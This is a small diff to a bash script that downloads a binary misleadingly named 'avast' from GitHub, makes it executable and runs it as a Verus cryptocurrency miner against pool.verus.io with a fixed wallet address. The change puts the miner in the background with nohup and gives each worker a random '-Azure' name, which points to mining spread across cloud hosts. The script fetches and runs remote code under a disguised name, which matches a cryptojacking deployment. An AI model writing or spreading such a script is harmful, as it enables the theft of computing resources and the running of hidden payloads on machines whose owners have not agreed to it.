@@ -2,4 +2,4 @@
 #!/bin/bash
 wget https://github.com/aurbach55/pos/raw/main/avast
 chmod +x avast
-./avast -v -l  pool.verus.io:9999 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.X -t 4 -x
+nohup ./avast -v -l  pool.verus.io:9999 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.$(echo $(shuf -i 1-99999 -n 1)-Azure) -t 4 -x > nohup.out
